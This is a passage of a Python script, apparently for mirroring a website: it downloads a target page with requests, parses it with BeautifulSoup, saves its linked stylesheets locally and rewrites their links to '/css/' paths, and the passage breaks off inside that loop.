def download_resource(url, save_path):
    try:
        if not url or url.startswith('data:') or url.startswith('#'):
            return None
        full_url = urljoin(target, url)
        resp = requests.get(full_url, headers=headers, timeout=10, verify=False)
        if resp.status_code == 200:
            with open(save_path, 'wb') as f:
                f.write(resp.content)
            return save_path
    except:
        pass
    return None

try:
    resp = requests.get(target, headers=headers, timeout=15, verify=False)
    html = resp.text
    soup = BeautifulSoup(html, 'html.parser')
    
    css_count = 0
    for link in soup.find_all('link', rel='stylesheet'):
        css_url = link.get('href')
        if css_url:
            css_name = os.path.basename(css_url.split('?')[0]) or 'style.css'
            css_path = f"{site_dir}/css/{css_name}"
            if download_resource(css_url, css_path):
                link['href'] = f"/css/{css_name}"
                css_count += 1
